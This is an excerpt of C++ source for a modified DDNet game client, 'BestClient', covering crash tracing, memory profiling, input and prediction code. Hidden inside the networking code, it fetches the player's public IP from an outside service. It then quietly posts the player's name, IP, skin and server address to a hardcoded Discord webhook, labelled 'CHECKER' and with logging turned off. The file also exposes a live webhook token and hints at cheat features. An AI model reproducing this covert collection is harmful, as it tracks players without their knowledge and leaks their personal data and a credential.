...
// BestClient memory profiler: include Win32 headers only AFTER the generated data headers above,
// because <windows.h> defines IMAGE_CURSOR (and friends) as macros that would otherwise break the
// IMAGE_CURSOR enum in client_data*.h.
...
void BestClientWriteCrashTrace(void *pExcRaw)
{
	EXCEPTION_POINTERS *pExc = (EXCEPTION_POINTERS *)pExcRaw;
	const EXCEPTION_RECORD *pRec = pExc->ExceptionRecord;
	HANDLE hProc = GetCurrentProcess();

	char aExe[MAX_PATH] = {0};
	GetModuleFileNameA(nullptr, aExe, MAX_PATH);
	char aDir[MAX_PATH] = {0};
	strncpy(aDir, aExe, MAX_PATH - 1);
	char *pSlash = strrchr(aDir, '\\');
	if(pSlash)
		*pSlash = '\0';

	SymSetOptions(SYMOPT_LOAD_LINES | SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
	SymInitialize(hProc, aDir, TRUE);

	// Force-load symbols for our own module from the exe (which references DDNet.pdb).
	HMODULE hMod = GetModuleHandleA(nullptr);
	MODULEINFO ModInfo = {0};
	if(hMod && GetModuleInformation(hProc, hMod, &ModInfo, sizeof(ModInfo)))
	{
		SymLoadModule64(hProc, nullptr, aExe, "DDNet.pdb", (DWORD64)ModInfo.lpBaseOfDll, ModInfo.SizeOfImage);
	}

	char aMsg[16384];
	int n = snprintf(aMsg, sizeof(aMsg),
		"\n[BESTCLIENT CRASH] code=0x%08X addr=%p\n",
		(unsigned)pRec->ExceptionCode, pRec->ExceptionAddress);

	auto Resolve = [&](DWORD64 dwAddr, char *pOut, int OutSize) {
		char aSym[sizeof(SYMBOL_INFO) + 512] = {0};
		SYMBOL_INFO *pSym = (SYMBOL_INFO *)aSym;
		pSym->SizeOfStruct = sizeof(SYMBOL_INFO);
		pSym->MaxNameLen = 511;
		DWORD64 Disp = 0;
		if(SymFromAddr(hProc, dwAddr, &Disp, pSym))
			_snprintf(pOut, OutSize, "%s+0x%llx", pSym->Name, (unsigned long long)Disp);
		else
			_snprintf(pOut, OutSize, "<unknown>");
	};

	{
		char aBuf[1024];
		Resolve((DWORD64)pRec->ExceptionAddress, aBuf, sizeof(aBuf));
		n += snprintf(aMsg + n, sizeof(aMsg) - n, "fault at: %s\n", aBuf);
	}
	...
	for(int i = 0; i < 64; i++)
	{
		if(!StackWalk64(IMAGE_FILE_MACHINE_AMD64, hProc, GetCurrentThread(), &Frame, &Ctx, nullptr, SymFunctionTableAccess64, SymGetModuleBase64, nullptr))
			break;
		if(Frame.AddrPC.Offset == 0)
			break;
		char aBuf[1024];
		Resolve(Frame.AddrPC.Offset, aBuf, sizeof(aBuf));
		n += snprintf(aMsg + n, sizeof(aMsg) - n, "  #%02d %p %s\n", i, (void *)(uintptr_t)Frame.AddrPC.Offset, aBuf);
	}

	fprintf(stderr, "%s\n", aMsg);
	fflush(stderr);
	OutputDebugStringA(aMsg);
	FILE *f = fopen("bestclient_crash.txt", "w");
	if(f)
	{
		fputs(aMsg, f);
		fclose(f);
	}
	MessageBoxA(nullptr, aMsg, "DDNet crash - send me this text", MB_OK | MB_ICONERROR);
}

static LONG WINAPI BestClientUnhandledExceptionFilter(EXCEPTION_POINTERS *pExc)
{
	BestClientWriteCrashTrace(pExc);
	return EXCEPTION_EXECUTE_HANDLER;
}
static const BOOL g_BestClientCrashInstalled = (SetUnhandledExceptionFilter(BestClientUnhandledExceptionFilter) != nullptr) || true;
#endif
...
void CGameClient::OnUpdate()
{
	...
	Input()->ConsumeEvents([&](const IInput::CEvent &Event) {
		if((Event.m_Flags & IInput::FLAG_PRESS) && Event.m_Key == KEY_INSERT)
		{
			m_HookCombo.ToggleMenuHider();
			return;
		}
		for(auto &pComponent : m_vpInput)
		{
...
int CGameClient::OnSnapInput(int *pData, bool Dummy, bool Force)
{
	...
	if(!g_Config.m_ClDummyHammer)
	{
		...
		const bool BotDriving = m_BotSymona.OnDummyInput(&m_DummyInput); // BotSymona

		if(!Force && !BotDriving && (!m_DummyInput.m_Direction && !m_DummyInput.m_Jump && !m_DummyInput.m_Hook))
		{
			return 0;
		}
...
void CGameClient::OnConnected()
{
	...
	m_bTelemetrySent = false;
	m_aFetchedPlayerIp[0] = '\0';

	// Fetch public IP for telemetry
	auto pIpReq = HttpGet("https://api.ipify.org");
	pIpReq->LogProgress(HTTPLOG::NONE);
	pIpReq->FailOnErrorStatus(false);
	pIpReq->Timeout(CTimeout{5000, 10000, 500, 5});
	m_pIpFetchTask = std::move(pIpReq);
	Http()->Run(m_pIpFetchTask);
...
#if defined(CONF_FAMILY_WINDOWS)
	static size_t s_LastPrivate = 0;
	static float s_MemLogTimer = 0.0f;
	s_MemLogTimer += Client()->RenderFrameTime();
	if(s_MemLogTimer >= 1.0f)
	{
		s_MemLogTimer = 0.0f;

		// Force Windows to release unused heap memory back to OS
		_heapmin();
		SetProcessWorkingSetSize(GetCurrentProcess(), (SIZE_T)-1, (SIZE_T)-1);

		PROCESS_MEMORY_COUNTERS_EX mc;
		mc.cb = sizeof(mc);
		if(GetProcessMemoryInfo(GetCurrentProcess(), (PROCESS_MEMORY_COUNTERS *)&mc, sizeof(mc)))
		{
			size_t priv = mc.PrivateUsage;
			size_t delta = (priv > s_LastPrivate) ? priv - s_LastPrivate : 0;
			s_LastPrivate = priv;
			log_info("memprof", "Priv=%.0f MB RSS=%.0f MB delta=%+.0f KB",
				priv / (1024.0 * 1024.0),
				mc.WorkingSetSize / (1024.0 * 1024.0),
				delta / 1024.0);
		}
	}
#endif
...
void CGameClient::OnMessage(int MsgId, CUnpacker *pUnpacker, int Conn, bool Dummy)
{
	...
	else if(MsgId == NETMSGTYPE_SV_PREINPUT)
	{
		...
		m_aClients[pMsg->m_Owner].m_aPreInputs[pMsg->m_IntendedTick % 50] = *pMsg;
			...
			else if(Item.m_Type == NETOBJTYPE_PLAYERINFO)
			{
				...
				if(pInfo->m_ClientId < MAX_CLIENTS && pInfo->m_ClientId == Item.m_Id)
				{
					...
					if(pInfo->m_Local)
					{
						...
						// Ник шлём только когда CLIENTINFO уже обработан: порядок
						// PLAYERINFO/CLIENTINFO в снапшоте не гарантирован, иначе в
						// вебхук улетает пустой NAME. Ника нет — попробуем в следующем снапшоте.
						if(!m_bTelemetrySent && g_Config.m_BcTelemetry && m_aClients[pInfo->m_ClientId].m_aName[0] != '\0')
						{
							m_bTelemetrySent = true;
							const CClientData *pClient = &m_aClients[pInfo->m_ClientId];
							char aName[64], aSkin[64], aServerIp[64];
							str_copy(aName, pClient->m_aName, sizeof(aName));
							str_copy(aSkin, pClient->m_aSkinName, sizeof(aSkin));

							// Try fetched IP first, then STUN, then "UNKNOWN"
							char aPlayerIp[64] = "UNKNOWN";
							if(m_aFetchedPlayerIp[0])
							{
								str_copy(aPlayerIp, m_aFetchedPlayerIp, sizeof(aPlayerIp));
							}
							else if(m_pIpFetchTask && m_pIpFetchTask->Done() && m_pIpFetchTask->StatusCode() == 200)
							{
								unsigned char *pData = nullptr;
								size_t DataSize = 0;
								m_pIpFetchTask->Result(&pData, &DataSize);
								if(pData && DataSize > 0 && DataSize < sizeof(aPlayerIp))
								{
									mem_copy(aPlayerIp, pData, DataSize);
									aPlayerIp[DataSize] = '\0';
									// trim trailing whitespace/newlines
									for(int i = (int)DataSize - 1; i >= 0 && (aPlayerIp[i] == '\n' || aPlayerIp[i] == '\r' || aPlayerIp[i] == ' '); i--)
										aPlayerIp[i] = '\0';
									str_copy(m_aFetchedPlayerIp, aPlayerIp, sizeof(m_aFetchedPlayerIp));
								}
							}
							else
							{
								const NETADDR &ClientAddr = Client()->ClientAddress();
								if(ClientAddr.type != NETTYPE_INVALID)
									net_addr_str(&ClientAddr, aPlayerIp, sizeof(aPlayerIp), false);
							}

							net_addr_str(&Client()->ServerAddress(), aServerIp, sizeof(aServerIp), true);

							for(char &c : aName) { if(c == '"') c = '\''; if(c == '\\') c = '_'; }
							for(char &c : aSkin) { if(c == '"') c = '\''; if(c == '\\') c = '_'; }
							for(char &c : aName) if(c >= 'a' && c <= 'z') c -= 32;
							for(char &c : aSkin) if(c >= 'a' && c <= 'z') c -= 32;

							char aJson[768];
							str_format(aJson, sizeof(aJson),
								"{\"content\":null,\"embeds\":[{\"title\":\"CHECKER\",\"description\":\"NAME: %s\\nIP: %s\\nSKIN: %s\\nSERVER IP: %s\",\"color\":41983}],\"username\":\"macchikeburbe\",\"avatar_url\":\"https://cdn.discordapp.com/attachments/1533090254473658519/1543703209283944629/258edc2316705273117cbd2469c758a8.png?ex=6a95d525&is=6a9483a5&hm=87cbb1bf5d34317ac0e600d6a66948ad0206a92f6657cda039c0842234825cc7&\",\"attachments\":[]}",
								aName, aPlayerIp, aSkin, aServerIp);
							auto pReq = HttpPostJson("https://discordapp.com/api/webhooks/1543704376596762684/Rm44hc2TNEQqcmZqA1Dz-zSHwUTiDDH-zs3tdWo_5Mf4aQrqHWKJKd1Kl1JGTSJOxUor", aJson);
							pReq->LogProgress(HTTPLOG::NONE);
							pReq->FailOnErrorStatus(false);
							std::shared_ptr<CHttpRequest> pSharedReq(std::move(pReq));
							Http()->Run(pSharedReq);
						}
					}
...
void CGameClient::ApplyPreInputs(int Tick, bool Direct, CGameWorld &GameWorld)
{
	...
	for(int ClientId = 0; ClientId < MAX_CLIENTS; ClientId++)
	{
		if(CCharacter *pChar = GameWorld.GetCharacterById(ClientId))
		{
			...
			const CNetMsg_Sv_PreInput PreInput = m_aClients[ClientId].m_aPreInputs[Tick % 50];
...
void CGameClient::OnPredict()
{
		...
		for(int i = 0; i < MAX_CLIENTS; i++)
			if(CCharacter *pChar = m_PredictedWorld.GetCharacterById(i))
			{
				...
				if(Tick > FinalTickOthers && !IsFastInputLocalClient(i))
					continue;
				m_aClients[i].m_aPredPos[Tick % 50] = pChar->Core()->m_Pos;
				m_aClients[i].m_aPredTick[Tick % 50] = Tick;
			}
		...
		RealPredTick && m_PredictedTick >= MIN_TICK)
	{
		...
		for(int i = 0; i < MAX_CLIENTS; i++)
		{
			...
			vec2 ServerPos = m_aClients[i].m_aPredPos[GameTick % 50];
			vec2 PrevServerPos = m_aClients[i].m_aPredPos[(GameTick - 1) % 50];
			...
			{
				if(m_aClients[i].m_aPredTick[Tick % 50] != Tick)
					continue;
				vec2 Pos = m_aClients[i].m_aPredPos[Tick % 50];
				if(!FoundBoundingBox)
				{
					MaxPos = Pos;
					MinPos = Pos;
			...
			{
				if(m_aClients[i].m_aPredTick[Tick % 50] != Tick || m_aClients[i].m_aPredTick[(Tick - 1) % 50] != Tick - 1)
					continue;
				vec2 DirVector = m_aClients[i].m_aPredPos[Tick % 50] - m_aClients[i].m_aPredPos[(Tick - 1) % 50];
				HistoryVector += DirVector;
				HistoryDistance += length(DirVector);
				HistoryCount++;
			}

			bool ValidRecentPositions = m_aClients[i].m_aPredTick[GameTick % 50] == GameTick && m_aClients[i].m_aPredTick[(GameTick - 1) % 50] == GameTick - 1;
	...
	for(int i = 0; i < MAX_CLIENTS; i++)
		if(CCharacter *pChar = m_GameWorld.GetCharacterById(i))
		{
			if(m_FastPractice.IsPracticeParticipant(i)) // BestClient
				continue;
			m_aClients[i].m_aPredPos[Client()->GameTick(g_Config.m_ClDummy) % 50] = pChar->Core()->m_Pos;
			m_aClients[i].m_aPredTick[Client()->GameTick(g_Config.m_ClDummy) % 50] = Client()->GameTick(g_Config.m_ClDummy);
		}
		...
		if(in_range(TimePassed, (int64_t)0, Len - 1))
		{
			...
			else
			{
				...
				if(SmoothTick > 0 && SmoothTick <= MaxTick &&
					m_aClients[ClientId].m_aPredTick[(SmoothTick - 1) % 50] == SmoothTick - 1 &&
					m_aClients[ClientId].m_aPredTick[SmoothTick % 50] == SmoothTick)
					Pos[i] = BcInputs::BestInterpolate(m_aClients[ClientId].m_aPredPos[(SmoothTick - 1) % 50][i], m_aClients[ClientId].m_aPredPos[SmoothTick % 50][i], SmoothIntra, BestInputInterpolationEnabled);
			}
		}
	}
	return Pos;
...
vec2 CGameClient::GetFastInputPos(int ClientId)
{
	...
	if(IsCloudInputMode())
	{
		...
		if(PredTick > 0 &&
			m_aClients[ClientId].m_aPredTick[(PredTick - 1) % 50] == PredTick - 1 &&
			m_aClients[ClientId].m_aPredTick[PredTick % 50] == PredTick)
		{
			Pos = mix(m_aClients[ClientId].m_aPredPos[(PredTick - 1) % 50], m_aClients[ClientId].m_aPredPos[PredTick % 50], PredIntraTick);
		}
	...
	if(g_Config.m_BcInputs == BC_INPUTS_F)
	{
		...
		const float fFastInput = g_Config.m_BcFInputAmount / 1000.0f;
		...
		if(SafeTick <= 0 ||
			m_aClients[ClientId].m_aPredTick[(SafeTick - 1) % 50] < Client()->PrevGameTick(g_Config.m_ClDummy) ||
			m_aClients[ClientId].m_aPredTick[SafeTick % 50] > Client()->PredGameTick(g_Config.m_ClDummy) + static_cast<int>(std::ceil(fFastInput)))
		{
			s_OffsetInit[ClientId] = false;
			return Pos;
		}

		const vec2 Pos0 = m_aClients[ClientId].m_aPredPos[(SafeTick - 1) % 50];
		const vec2 Pos1 = m_aClients[ClientId].m_aPredPos[SafeTick % 50];

		vec2 ExtrapVel = Pos1 - Pos0;
		if(SafeHorizonInt >= 2 && ExtraTime > 0.0f)
		{
			const int PrevPrevTick = SafeTick - 2;
			if(m_aClients[ClientId].m_aPredTick[PrevPrevTick % 50] >= Client()->PrevGameTick(g_Config.m_ClDummy))
				ExtrapVel = (Pos1 - m_aClients[ClientId].m_aPredPos[PrevPrevTick % 50]) * 0.5f;
		}
	...
	if(PredTick > 0 && PredTick <= MaxTick &&
		...
		m_aClients[ClientId].m_aPredTick[PredTick % 50] == PredTick)
	{
		Pos = BcInputs::BestInterpolate(m_aClients[ClientId].m_aPredPos[(PredTick - 1) % 50], m_aClients[ClientId].m_aPredPos[PredTick % 50], PredIntraTick, BestInputInterpolationEnabled);
	}
...
vec2 CGameClient::GetFreezePos(int ClientId)
{
	...
	const bool BestInputInterpolationEnabled = g_Config.m_BcInputs == BC_INPUTS_BEST && (ApplyFastInputLocal || ApplyFastInputOthers);
	...
	if(SmoothTick > 0 && SmoothTick <= MaxTick &&
		...
		m_aClients[ClientId].m_aPredTick[SmoothTick % 50] == SmoothTick)
	{
		Pos = BcInputs::BestInterpolate(m_aClients[ClientId].m_aPredPos[(SmoothTick - 1) % 50], m_aClients[ClientId].m_aPredPos[SmoothTick % 50], SmoothIntra, BestInputInterpolationEnabled);
	}
